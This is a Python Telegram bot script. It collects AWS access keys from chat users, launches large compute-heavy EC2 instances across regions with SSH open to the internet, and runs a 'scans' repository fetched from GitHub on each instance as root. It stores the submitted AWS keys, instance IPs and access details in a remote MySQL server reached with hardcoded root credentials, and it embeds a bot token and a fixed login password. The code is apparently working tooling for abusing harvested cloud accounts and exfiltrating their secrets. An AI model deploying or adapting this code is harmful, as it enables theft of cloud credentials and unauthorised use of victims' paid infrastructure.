import logging
import boto3
import sys
import time
import mysql.connector
from mysql.connector import Error
import getpass
from botocore.exceptions import ClientError
import paramiko
import pexpect
import subprocess
import os
from telegram import Update, ForceReply
from telegram.constants import ParseMode
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext, ConversationHandler
from tqdm import tqdm
import concurrent.futures

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define conversation states
AWS_CREDENTIALS, INSTANCE_COUNT = range(2)

# Helper functions
def merge_dict(a, b):
    d = a.copy()
    d.update(b)
    return d

def add_server(ip_address, scan_path, key_path, password, aws_access_key, aws_secret_key, aws_region, instance_id, instance_type):
    if key_path is None or key_path == "":
        key_path = "/home/vshell/.ssh/admkey"
    if password is None:
        password = ""
        
    try:
        connection = mysql.connector.connect(
            host='94.156.67.171',
            database='rez',
            user='root',
            password='Stupid!Rac00n666'
        )

        if connection.is_connected():
            cursor = connection.cursor()
            insert_query = """INSERT INTO servers (ip_address, scan_path, key_path, password, aws_access_key, aws_secret_key, aws_region, instance_id, instance_type, is_deployed) 
                              VALUES (%s, %s, %s, %s, %s, %s, %s, %s, %s, %s)"""
            record = (ip_address, scan_path, key_path, password, aws_access_key, aws_secret_key, aws_region, instance_id, instance_type, False)
            cursor.execute(insert_query, record)
            connection.commit()
            print(f"Server {ip_address} added to the database successfully.")
            
    except Error as e:
        print(f"Failed to insert record into MySQL table {e}")
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()
            print("MySQL connection is closed")

def update_is_deployed(instance_id):
    try:
        connection = mysql.connector.connect(
            host='94.156.67.171',
            database='rez',
            user='root',
            password='Stupid!Rac00n666'
        )
        if connection.is_connected():
            cursor = connection.cursor()
            update_query = "UPDATE servers SET is_deployed = TRUE WHERE instance_id = %s"
            cursor.execute(update_query, (instance_id,))
            connection.commit()
            print(f"Server {instance_id} marked as deployed.")
    except Error as e:
        print(f"Failed to update is_deployed for server {instance_id}: {e}")
    finally:
        if connection.is_connected():
            cursor.close()
            connection.close()
            print("MySQL connection is closed")

def wait_for_instance(ip_address, key_path=None, password=None, timeout=300):
    start_time = time.time()
    while time.time() - start_time < timeout:
        try:
            if key_path:
                ssh_command = f"ssh -i {key_path} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@{ip_address} 'exit'"
            else:
                ssh_command = f"sshpass -p {password} ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@{ip_address} 'exit'"

            result = subprocess.run(ssh_command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                return True
        except Exception as e:
            print(f"Waiting for the instance to be ready... {e}")
            time.sleep(10)
    return False

def execute_commands_on_instance_with_password(ip_address, password):
    if not wait_for_instance(ip_address, password=password):
        print(f"Instance {ip_address} is not ready for SSH connections.")
        return False

    try:
        ssh_command = f"sshpass -p '{password}' ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@{ip_address}"
        child = pexpect.spawn(ssh_command)
        child.expect("ubuntu@.*'s password:", timeout=120)
        child.sendline(password)
        child.expect(r'\$', timeout=120)

        commands = [
            'git clone https://github.com/krambopolos/scans.git /home/ubuntu/scans || true',
            'sudo chmod +x /home/ubuntu/scans/install.sh',
            'sudo chmod -R 777 /home/ubuntu/scans',
            'sudo mkdir -p /home/ubuntu/scans/scans',
            'sudo chmod -R 777 /home/ubuntu/scans/scans',
            'cd /home/ubuntu/scans',
            'ls -l /home/ubuntu/scans',  # Affiche le contenu du répertoire
            '[ -f /home/ubuntu/scans/install.sh ] && echo "install.sh exists and is executable"'
        ]
        
        for command in commands:
            child.sendline(command)
            child.expect(r'\$', timeout=300)  # Augmentation du délai d'attente
            print(f"Executing: {command}")
            print(child.before.decode(errors='ignore'))  # Utiliser errors='ignore'
        
        # Vérifier la sortie du script install.sh en utilisant le chemin absolu
        child.sendline('sudo /home/ubuntu/scans/install.sh')
        child.expect(r'\$', timeout=600)  # Temps supplémentaire pour le script
        print(f"Output of install.sh:\n{child.before.decode(errors='ignore')}")  # Utiliser errors='ignore'

        child.sendline("exit")
        child.expect(pexpect.EOF)
        
        return True
    except pexpect.TIMEOUT:
        print(f"Timeout while connecting to instance {ip_address}")
        return False
    except pexpect.EOF:
        print(f"End Of File (EOF) while connecting to instance {ip_address}. This usually means the connection was closed by the remote host.")
        print(child.before.decode(errors='ignore'))  # Utiliser errors='ignore'
        return False
    except Exception as e:
        print(f"Failed to execute commands on instance {ip_address}: {str(e)}")
        return False

def execute_commands_on_instance_with_key(ip_address, key_path):
    if not wait_for_instance(ip_address, key_path=key_path):
        print(f"Instance {ip_address} is not ready for SSH connections.")
        return False

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(ip_address, username='ubuntu', key_filename=key_path)
        commands = [
            'git clone https://github.com/krambopolos/scans.git /home/ubuntu/scans || true',
            'sudo chmod +x /home/ubuntu/scans/install.sh',
            'sudo chmod -R 777 /home/ubuntu/scans',
            'sudo mkdir -p /home/ubuntu/scans/scans',
            'sudo chmod -R 777 /home/ubuntu/scans/scans',
            'cd /home/ubuntu/scans',
            'ls -l /home/ubuntu/scans',  # Affiche le contenu du répertoire
            '[ -f /home/ubuntu/scans/install.sh ] && echo "install.sh exists and is executable"'
        ]
        for command in commands:
            stdin, stdout, stderr = ssh.exec_command(command)
            stdout.channel.recv_exit_status()  # Attendre la fin de l'exécution
            print(f"Executing: {command}")
            print(stdout.read().decode(errors='ignore'))  # Utiliser errors='ignore'
            print(stderr.read().decode(errors='ignore'))  # Utiliser errors='ignore'
        
        # Vérifier la sortie du script install.sh en utilisant le chemin absolu
        stdin, stdout, stderr = ssh.exec_command('sudo /home/ubuntu/scans/install.sh')
        stdout.channel.recv_exit_status()
        print(f"Output of install.sh:\n{stdout.read().decode(errors='ignore')}")  # Utiliser errors='ignore'
        print(f"Errors of install.sh:\n{stderr.read().decode(errors='ignore')}")  # Utiliser errors='ignore'

        return True
    except Exception as e:
        print(f"Failed to execute commands on instance {ip_address}: {str(e)}")
        return False
    finally:
        ssh.close()

def configure_aws_session(access_key, secret_key, region=None):
    if not region:
        region = 'us-east-1'  # Default region if not provided
    try:
        boto3.setup_default_session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key,
            region_name=region
        )
    except Exception as e:
        print(f"Failed to configure AWS session: {str(e)}")
        sys.exit(1)

def list_all_regions():
    ec2_client = boto3.client('ec2')
    regions = ec2_client.describe_regions()
    return [region['RegionName'] for region in regions['Regions']]

def get_running_instances_count_by_region():
    ec2_client = boto3.client('ec2')
    # Liste exhaustive des régions AWS
    regions = [
        'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1',
        'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2', 'ap-southeast-3', 'ca-central-1',
        'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1', 'eu-south-1', 'eu-south-2',
        'me-south-1', 'me-central-1', 'sa-east-1', 'us-gov-west-1', 'us-gov-east-1'
    ]

    instance_counts = {}

    for region in regions:
        ec2 = boto3.client('ec2', region_name=region)
        try:
            response = ec2.describe_instances(Filters=[{'Name': 'instance-state-name', 'Values': ['running']}])
            instance_count = sum([len(reservation['Instances']) for reservation in response['Reservations']])
            instance_counts[region] = instance_count
            print(f"Region: {region}, Running Instances: {instance_count}")
        except ClientError as e:
            if "AuthFailure" in str(e):
                print(f"Error fetching instances for region {region}: {e}")
            else:
                raise
        time.sleep(1)  # Ajouter un délai pour éviter de surcharger les requêtes
    
    return instance_counts


def check_current_user_has_admin(iam_client, user_name):
    admin_policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
    
    try:
        response = iam_client.list_attached_user_policies(UserName=user_name)
        policies = response.get('AttachedPolicies', [])
        for policy in policies:
            if policy['PolicyArn'] == admin_policy_arn:
                print(f"User {user_name} already has the AdministratorAccess policy attached.")
                return True
        print(f"User {user_name} does not have the AdministratorAccess policy attached.")
        return False
    except ClientError as e:
        print(f"Error checking policies for user {user_name}: {e}")
        return False

def decode_authorization_message(encoded_message):
    sts_client = boto3.client('sts')
    response = sts_client.decode_authorization_message(
        EncodedMessage=encoded_message
    )
    print(response['DecodedMessage'])

def get_ec2_vcpu_quotas():
    ec2_client = boto3.client('ec2')
    # Liste exhaustive des régions AWS
    regions = [
        'us-east-1', 'us-east-2', 'us-west-1', 'us-west-2', 'af-south-1', 'ap-east-1', 'ap-south-1', 'ap-northeast-1',
        'ap-northeast-2', 'ap-northeast-3', 'ap-southeast-1', 'ap-southeast-2', 'ap-southeast-3', 'ca-central-1',
        'eu-central-1', 'eu-west-1', 'eu-west-2', 'eu-west-3', 'eu-north-1', 'eu-south-1', 'eu-south-2',
        'me-south-1', 'me-central-1', 'sa-east-1', 'us-gov-west-1', 'us-gov-east-1'
    ]

    vcpu_quota_code = 'L-1216C47A'  # vCPU quota code
    region_quotas = {}
    
    for region in regions:
        print(f"Checking vCPU quotas in region: {region}")
        client = boto3.client('service-quotas', region_name=region)
        
        try:
            response = client.list_service_quotas(ServiceCode='ec2')
            for quota in response['Quotas']:
                if quota['QuotaCode'] == vcpu_quota_code:
                    quota_value = quota['Value']
                    print(f"Region: {region}, vCPU Quota: {quota_value}")
                    region_quotas[region] = quota_value
                    break
        except ClientError as e:
            print(f"Error fetching quotas for region {region}: {e}")
    
    return region_quotas

def create_vpc():
    try:
        ec2 = boto3.resource('ec2')
        vpc = ec2.create_vpc(CidrBlock='10.0.0.0/16')
        vpc.create_tags(Tags=[{"Key": "Name", "Value": "MyVPC"}])
        vpc.wait_until_available()
        print(f"VPC created: {vpc.id}")
        return vpc
    except Exception as e:
        print(f"Failed to create VPC: {str(e)}")
        return None

def get_existing_vpc_with_internet_access():
    ec2 = boto3.client('ec2')
    vpcs = ec2.describe_vpcs()
    for vpc in vpcs['Vpcs']:
        vpc_id = vpc['VpcId']
        print(f"Checking VPC: {vpc_id}")
        igws = ec2.describe_internet_gateways(Filters=[{'Name': 'attachment.vpc-id', 'Values': [vpc_id]}])
        if igws['InternetGateways']:
            rtbs = ec2.describe_route_tables(Filters=[{'Name': 'vpc-id', 'Values': [vpc_id]}])
            for rtb in rtbs['RouteTables']:
                for route in rtb['Routes']:
                    if route.get('GatewayId') in [igw['InternetGatewayId'] for igw in igws['InternetGateways']] and route.get('DestinationCidrBlock') == '0.0.0.0/0':
                        print(f"VPC {vpc_id} has internet access.")
                        return boto3.resource('ec2').Vpc(vpc_id)
    print("No existing VPC with internet access found.")
    return None

def create_internet_gateway(vpc):
    try:
        internet_gateway = boto3.resource('ec2').create_internet_gateway()
        vpc.attach_internet_gateway(InternetGatewayId=internet_gateway.id)
        print(f"Internet Gateway created and attached: {internet_gateway.id}")
        return internet_gateway
    except Exception as e:
        print(f"Failed to create or attach Internet Gateway: {str(e)}")
        return None

def get_most_permissive_internet_gateway(vpc):
    ec2 = boto3.client('ec2')
    response = ec2.describe_internet_gateways(Filters=[{'Name': 'attachment.vpc-id', 'Values': [vpc.id]}])
    if response['InternetGateways']:
        internet_gateway_id = response['InternetGateways'][0]['InternetGatewayId']
        print(f"Using existing Internet Gateway: {internet_gateway_id}")
        return boto3.resource('ec2').InternetGateway(internet_gateway_id)
    else:
        print("No existing Internet Gateway found.")
        return None

def create_route_table(vpc, internet_gateway):
    try:
        route_table = vpc.create_route_table()
        route_table.create_route(DestinationCidrBlock='0.0.0.0/0', GatewayId=internet_gateway.id)
        print(f"Route Table created: {route_table.id}")
        return route_table
    except Exception as e:
        print(f"Failed to create Route Table or route: {str(e)}")
        return None

def get_most_permissive_route_table(vpc):
    ec2 = boto3.client('ec2')
    response = ec2.describe_route_tables(Filters=[{'Name': 'vpc-id', 'Values': [vpc.id]}])
    if response['RouteTables']:
        route_table_id = response['RouteTables'][0]['RouteTableId']
        print(f"Using existing Route Table: {route_table_id}")
        return boto3.resource('ec2').RouteTable(route_table_id)
    else:
        print("No existing Route Table found.")
        return None

def associate_route_table_with_subnet(route_table, subnet):
    ec2 = boto3.client('ec2')
    associations = ec2.describe_route_tables(
        RouteTableIds=[route_table.id]
    )
    for association in associations['RouteTables'][0]['Associations']:
        if 'SubnetId' in association and association['SubnetId'] == subnet.id:
            print(f"Subnet {subnet.id} is already associated with route table {route_table.id}")
            return
    route_table.associate_with_subnet(SubnetId=subnet.id)
    print(f"Route table {route_table.id} associated with subnet {subnet.id}")

def get_available_zones(region):
    ec2_client = boto3.client('ec2', region_name=region)
    response = ec2_client.describe_availability_zones()
    zones = [zone['ZoneName'] for zone in response['AvailabilityZones'] if zone['State'] == 'available']
    return zones

def create_subnet(vpc, cidr_block, availability_zone):
    try:
        subnet = vpc.create_subnet(CidrBlock=cidr_block, AvailabilityZone=availability_zone)
        print(f"Subnet created: {subnet.id} in {availability_zone}")
        return subnet
    except Exception as e:
        print(f"Failed to create subnet: {str(e)}")
        return None

def get_supported_instance_type_zones(region, instance_type):
    ec2_client = boto3.client('ec2', region_name=region)
    available_zones = get_available_zones(region)
    supported_zones = []
    
    for zone in available_zones:
        try:
            ec2_client.describe_instance_type_offerings(
                LocationType='availability-zone',
                Filters=[
                    {'Name': 'instance-type', 'Values': [instance_type]},
                    {'Name': 'location', 'Values': [zone]}
                ]
            )
            supported_zones.append(zone)
        except ClientError as e:
            print(f"Zone {zone} does not support {instance_type}: {str(e)}")
    
    return supported_zones

def list_instance_types(region):
    ec2_client = boto3.client('ec2', region_name=region)
    response = ec2_client.describe_instance_types()
    instance_types = [instance_type['InstanceType'] for instance_type in response['InstanceTypes']]
    return instance_types

def get_most_permissive_subnet(vpc):
    ec2 = boto3.client('ec2')
    response = ec2.describe_subnets(Filters=[{'Name': 'vpc-id', 'Values': [vpc.id]}])
    if response['Subnets']:
        subnet_id = response['Subnets'][0]['SubnetId']
        print(f"Using existing Subnet: {subnet_id}")
        return boto3.resource('ec2').Subnet(subnet_id)
    else:
        print("No existing Subnet found.")
        return None

def create_security_group(vpc, name, description):
    try:
        sg = vpc.create_security_group(GroupName=name, Description=description)
        sg.authorize_ingress(
            IpPermissions=[
                {'IpProtocol': 'tcp',
                 'FromPort': 22,
                 'ToPort': 22,
                 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}
            ]
        )
        sg.authorize_egress(
            IpPermissions=[
                {'IpProtocol': 'tcp',
                 'FromPort': 0,
                 'ToPort': 65535,
                 'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}
            ]
        )
        print(f"Security Group created: {sg.id}")
        return sg
    except Exception as e:
        print(f"Failed to create or configure Security Group: {str(e)}")
        return None

def get_most_permissive_security_group(vpc):
    ec2 = boto3.client('ec2')
    response = ec2.describe_security_groups(Filters=[{'Name': 'vpc-id', 'Values': [vpc.id]}])
    if response['SecurityGroups']:
        security_group_id = response['SecurityGroups'][0]['GroupId']
        print(f"Using existing Security Group: {security_group_id}")
        return boto3.resource('ec2').SecurityGroup(security_group_id)
    else:
        print("No existing Security Group found.")
        return None

def import_ssh_key(key_name, key_path):
    ec2 = boto3.client('ec2')
    try:
        with open(key_path, 'r') as key_file:
            key_material = key_file.read()
        response = ec2.import_key_pair(KeyName=key_name, PublicKeyMaterial=key_material)
        print(f"SSH Key imported: {response['KeyName']}")
        key_path_in_db = f"/home/vshell/.ssh/{key_name}"  # Utilisez le chemin complet sans le tilde
        return response, key_path, key_path_in_db
    except ClientError as e:
        if 'InvalidKeyPair.Duplicate' in str(e):
            print(f"Key pair {key_name} already exists. Using existing key.")
            key_path_in_db = f"/home/vshell/.ssh/{key_name}"  # Utilisez le chemin complet sans le tilde
            return {'KeyName': key_name}, key_path, key_path_in_db
        else:
            print(f"Failed to import SSH key: {str(e)}")
            return None, None, None

def get_ubuntu_ami(region):
    ec2_client = boto3.client('ec2', region_name=region)
    response = ec2_client.describe_images(
        Filters=[
            {'Name': 'name', 'Values': ['ubuntu/images/hvm-ssd/ubuntu-jammy-22.04-amd64-server-*']},
            {'Name': 'architecture', 'Values': ['x86_64']},
            {'Name': 'state', 'Values': ['available']},
            {'Name': 'root-device-type', 'Values': ['ebs']}
        ],
        Owners=['099720109477']  # Canonical's AWS owner ID
    )
    images = response['Images']
    images.sort(key=lambda x: x['CreationDate'], reverse=True)
    if images:
        return images[0]['ImageId']
    else:
        return None

def launch_ec2_instances(ec2_resource, ami_id, instance_type, key_name, security_group_id, subnet_id, instance_count, user_data=None):
    instance_params = {
        'ImageId': ami_id,
        'InstanceType': instance_type,  # Use the selected instance type
        'MinCount': 1,
        'MaxCount': instance_count,
        'NetworkInterfaces': [{
            'SubnetId': subnet_id,
            'DeviceIndex': 0,
            'AssociatePublicIpAddress': True,
            'Groups': [security_group_id]
        }],
        'BlockDeviceMappings': [
            {
                'DeviceName': '/dev/sda1',
                'Ebs': {
                    'VolumeSize': 1000,  # 1000 GB volume
                    'VolumeType': 'gp2',  # General Purpose SSD
                    'DeleteOnTermination': True
                }
            }
        ]
    }
    if user_data:
        instance_params['UserData'] = user_data
    if key_name:
        instance_params['KeyName'] = key_name

    instances = ec2_resource.create_instances(**instance_params)
    
    for instance in instances:
        print(f"Launching EC2 instance: {instance.id}")
    return instances

def get_instance_public_ip(instance):
    instance.wait_until_running()
    instance.reload()
    return instance.public_ip_address

def ensure_internet_access(vpc, internet_gateway, route_table, subnet, security_group):
    if not internet_gateway:
        print("No existing Internet Gateway found. Creating a new one...")
        internet_gateway = create_internet_gateway(vpc)
        if not internet_gateway:
            print("Failed to create or attach Internet Gateway. Exiting.")
            sys.exit(1)
    
    if not route_table:
        print("No existing Route Table found. Creating a new one...")
        route_table = create_route_table(vpc, internet_gateway)
        if not route_table:
            print("Failed to create Route Table. Exiting.")
            sys.exit(1)
    else:
        try:
            route_table.create_route(DestinationCidrBlock='0.0.0.0/0', GatewayId=internet_gateway.id)
        except ClientError as e:
            if 'InvalidPermission.Duplicate' not in str(e):
                print(f"Error creating route in Route Table: {e}")
    
    if subnet:
        try:
            associate_route_table_with_subnet(route_table, subnet)
        except ClientError as e:
            print(f"Error associating route table with subnet: {e}")

    if not security_group:
        print("No existing Security Group found. Creating a new one...")
        security_group = create_security_group(vpc, 'OpenAccess', 'Security group with open access')
        if not security_group:
            print("Failed to create Security Group. Exiting.")
            sys.exit(1)
    else:
        try:
            sg = boto3.resource('ec2').SecurityGroup(security_group.id)
            sg.authorize_ingress(
                IpPermissions=[
                    {'IpProtocol': 'tcp',
                     'FromPort': 22,
                     'ToPort': 22,
                     'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}
                ]
            )
            sg.authorize_egress(
                IpPermissions=[
                    {'IpProtocol': 'tcp',
                     'FromPort': 0,
                     'ToPort': 65535,
                     'IpRanges': [{'CidrIp': '0.0.0.0/0'}]}
                ]
            )
        except ClientError as e:
            if 'InvalidPermission.Duplicate' not in str(e):
                print(f"Error configuring Security Group: {e}")

def configure_proxy(username, password, ip, port):
    proxy = "socks5://{username}:{password}@{ip}:{port}".format(username=username, password=password, ip=ip, port=port)
    opener = build_opener(SocksiPyHandler(socks.SOCKS5, ip, port, username=username, password=password))
    urllib.request.install_opener(opener)
    print(f"Configured proxy: {proxy}")

def deploy_bot_on_instance(instance, use_password, key_path_or_password, access_key, secret_key, default_region, selected_instance_type):
    ip_address = get_instance_public_ip(instance)
    if not ip_address:
        print("Public IP is None, retrying...")
        time.sleep(10)  # Wait for a short period to allow IP address assignment
        instance.reload()
        ip_address = instance.public_ip_address
    if not ip_address:
        print("Public IP is still None, attempting to retrieve it again.")
        ec2_client = boto3.client('ec2')
        response = ec2_client.describe_instances(InstanceIds=[instance.id])
        ip_address = response['Reservations'][0]['Instances'][0].get('PublicIpAddress')
    
    scan_path = "/home/ubuntu/scans/scans"
    print(f"Instance {instance.id} is running. Public IP: {ip_address}")
    add_server(f"ubuntu@{ip_address}", scan_path, key_path_or_password if use_password else "/home/vshell/.ssh/admkey", key_path_or_password if use_password else "", access_key, secret_key, default_region, instance.id, selected_instance_type)
    
    if use_password:
        success = execute_commands_on_instance_with_password(ip_address, key_path_or_password)
    else:
      success = execute_commands_on_instance_with_key(ip_address, key_path_or_password)
    
    if success:
        update_is_deployed(instance.id)
    return success

# Helper functions for message formatting
def format_success_message(message: str) -> str:
    return f"✅ {message}"

def format_error_message(message: str) -> str:
    return f"❌ {message}"

def format_report_message(header: str, body: str) -> str:
    return f"📋 *{header}*\n\n{body}"

def format_instance_listing(instances: dict) -> str:
    message = "📍 *Instances by Region:*\n\n"
    for region, count in instances.items():
        message += f"🌎 {region} 📟 {count} instances\n"
    return message

def format_vcpu_quota_listing(quotas: dict) -> str:
    message = "📊 *vCPU Quotas by Region:*\n\n"
    for region, quota in quotas.items():
        message += f"🌎 {region}  🧮 Quota {quota} vCPUs\n"
    return message

def format_vpc_status(vpc, internet_access) -> str:
    if internet_access:
        return f"🌐 VPC {vpc.id} has internet access."
    else:
        return f"🔒 VPC {vpc.id} does not have internet access."

# Telegram Bot Functions
def start(update: Update, context: CallbackContext) -> int:
    update.message.reply_text('Enter your AWS Access Key ID:')
    return AWS_CREDENTIALS

def aws_credentials(update: Update, context: CallbackContext) -> int:
    context.user_data['aws_access_key'] = update.message.text
    update.message.reply_text('Enter your AWS Secret Access Key:')
    return INSTANCE_COUNT

def instance_count(update: Update, context: CallbackContext) -> int:
    context.user_data['aws_secret_key'] = update.message.text
    update.message.reply_text('Enter the number of EC2 instances to launch:')
    return ConversationHandler.END

def handle_instance_count(update: Update, context: CallbackContext) -> None:
    instance_count = int(update.message.text)
    access_key = context.user_data['aws_access_key']
    secret_key = context.user_data['aws_secret_key']
    default_region = 'us-east-1'

    configure_aws_session(access_key, secret_key, default_region)

    iam_client = boto3.client('iam')
    sts_client = boto3.client('sts')

    try:
        identity = sts_client.get_caller_identity()
        user_arn = identity['Arn']
        user_name = user_arn.split('/')[-1]
    except ClientError as e:
        update.message.reply_text(format_error_message(f"Failed to get caller identity: {e}"))
        return

    if check_current_user_has_admin(iam_client, user_name):
        update.message.reply_text(format_success_message("Current user already has AdministratorAccess policy. Continuing with this user."))
        current_user, new_access_key, new_secret_key = user_name, None, None
    else:
        update.message.reply_text(format_error_message("Current user does not have AdministratorAccess policy. Continuing without admin privileges."))
        current_user, new_access_key, new_secret_key = user_name, None, None  # Continue sans les privilèges admin

    try:
        region_quotas = get_ec2_vcpu_quotas()
        update.message.reply_text(format_vcpu_quota_listing(region_quotas), parse_mode=ParseMode.MARKDOWN)
    except ClientError as e:
        update.message.reply_text(format_error_message(f"Error fetching EC2 quotas: {e}"))
        region_quotas = {}

    try:
        region_instance_counts = get_running_instances_count_by_region()
        update.message.reply_text(format_instance_listing(region_instance_counts), parse_mode=ParseMode.MARKDOWN)
    except ClientError as e:
        update.message.reply_text(format_error_message(f"Error fetching running instances: {e}"))
        region_instance_counts = {}

    max_instance_region = max(region_instance_counts, key=region_instance_counts.get, default='us-east-1')
    
    regions_to_try = list(region_quotas.keys())
    default_region = max_instance_region
    configure_aws_session(access_key, secret_key, default_region)

    instance_types_priority = [
        "c5.18xlarge", "c5n.18xlarge", "c5n.9xlarge", "c5n.metal",
        "c5.9xlarge", "c5.12xlarge", "c5.24xlarge"
    ]

    instances = None  # Initialiser la variable instances

    while regions_to_try:
        available_instance_type = None
        for instance_type in instance_types_priority:
            try:
                supported_zones = get_supported_instance_type_zones(default_region, instance_type)
                if supported_zones:
                    available_instance_type = instance_type
                    availability_zone = supported_zones[0]
                    break
            except ClientError as e:
                update.message.reply_text(format_error_message(f"Error checking supported instance types for {instance_type} in {default_region}: {e}"))

        if available_instance_type:
            update.message.reply_text(format_success_message(f"Selected instance type: {available_instance_type} in zone {availability_zone}"))
        else:
            update.message.reply_text(format_error_message(f"No available instance types found in {default_region}. Trying another region..."))
            if default_region in regions_to_try:
                regions_to_try.remove(default_region)
            if not regions_to_try:
                update.message.reply_text(format_error_message("No regions left to try. Exiting."))
                return
            default_region = regions_to_try[0]
            configure_aws_session(access_key, secret_key, default_region)
            continue

        vpc = get_existing_vpc_with_internet_access()
        if not vpc:
            vpc = create_vpc()

        if not vpc:
            update.message.reply_text(format_error_message("Failed to create or find an existing VPC. Exiting."))
            return

        internet_gateway = get_most_permissive_internet_gateway(vpc)
        route_table = get_most_permissive_route_table(vpc)
        subnet = get_most_permissive_subnet(vpc)

        if not subnet:
            update.message.reply_text("No existing Subnet found. Creating a new one...")
            try:
                supported_zones = get_supported_instance_type_zones(default_region, 't2.micro')
                if not supported_zones:
                    update.message.reply_text(format_error_message("No availability zones found that support the instance type. Exiting."))
                    return
                availability_zone = supported_zones[0]
                subnet = create_subnet(vpc, '10.0.1.0/24', availability_zone)
                if not subnet:
                    update.message.reply_text(format_error_message("Failed to create Subnet. Exiting."))
                    return
            except ClientError as e:
                update.message.reply_text(format_error_message(f"Error creating subnet in {default_region}: {e}"))
                return

        security_group = get_most_permissive_security_group(vpc)

        ensure_internet_access(vpc, internet_gateway, route_table, subnet, security_group)

        key_name = "admkey"
        key_path = f"./{key_name}.pub"
        ssh_key_response, local_key_path, key_path_in_db = import_ssh_key(key_name, key_path)

        ami_id = get_ubuntu_ami(default_region)
        if not ami_id:
            update.message.reply_text(format_error_message("Failed to find a suitable Ubuntu 22.04 AMI."))
            return

        update.message.reply_text(format_success_message(f"Found Ubuntu 22.04 AMI: {ami_id}"))

        try:
            use_password = False
            if ssh_key_response:
                instances = launch_ec2_instances(boto3.resource('ec2'), ami_id, available_instance_type, key_name, security_group.id, subnet.id, instance_count)
                key_path_or_password = local_key_path
            else:
                user_data = '''#cloud-config
                users:
                  - name: ubuntu
                    groups: sudo
                    sudo: ['ALL=(ALL) NOPASSWD:ALL']
                    shell: /bin/bash
                    passwd: $6$rounds=4096$4bB2hL8GQkFgE0Tv$QljfT8lA5cYQH4YFbEveIrWOlx2wU4zKysbg9T0zJ7YrrUb9lrm3Ll1aYGaIOfn/GojFL5GqAy6Xt3HUVck3J0
                chpasswd:
                  list: |
                    ubuntu:Stupid!rac00n
                  expire: False
                ssh_pwauth: true
                '''
                instances = launch_ec2_instances(boto3.resource('ec2'), ami_id, available_instance_type, None, security_group.id, subnet.id, instance_count, user_data=user_data)
                key_path_or_password = "Stupid!rac00n"
                use_password = True
            break  # If instance launch is successful, break out of the loop
        except ClientError as e:
            update.message.reply_text(format_error_message(f"Error launching EC2 instances: {e}"))
            if "Blocked" in str(e):
                update.message.reply_text(format_error_message(f"Account is blocked in region {default_region}. Trying another region..."))
                if default_region in regions_to_try:
                    regions_to_try.remove(default_region)
                if not regions_to_try:
                    update.message.reply_text(format_error_message("No regions left to try. Exiting."))
                    return
                default_region = regions_to_try[0]
                configure_aws_session(access_key, secret_key, default_region)
            else:
                return

    deploy_bot = 'yes'
    if deploy_bot == 'yes' and instances:
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for instance in instances:
                futures.append(executor.submit(deploy_bot_on_instance, instance, use_password, key_path_or_password, access_key, secret_key, default_region, available_instance_type))
            
            for i, future in enumerate(tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="Deployments")):
                try:
                    result = future.result()
                    if result:
                        update.message.reply_text(format_success_message(f"Deployment {i + 1}/{len(futures)} completed successfully."))
                    else:
                        update.message.reply_text(format_error_message(f"Deployment {i + 1}/{len(futures)} failed."))
                except Exception as e:
                    update.message.reply_text(format_error_message(f"Deployment {i + 1}/{len(futures)} generated an exception: {e}"))
                    
def main():
    # Initialize the bot with your token
    updater = Updater("7083965936:AAHSp611NNvZN4VIsxxjXIy9oektYRMqjxs")

    # Get the dispatcher to register handlers
    dispatcher = updater.dispatcher

    # Add conversation handler with the states AWS_CREDENTIALS and INSTANCE_COUNT
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={
            AWS_CREDENTIALS: [MessageHandler(filters.TEXT & ~filters.COMMAND, aws_credentials)],
            INSTANCE_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, instance_count)],
        },
        fallbacks=[CommandHandler('start', start)],
    )

    dispatcher.add_handler(conv_handler)
    dispatcher.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_instance_count))

    # Start the Bot
    updater.start_polling()

    # Run the bot until you press Ctrl-C
    updater.idle()

if __name__ == "__main__":
    main()
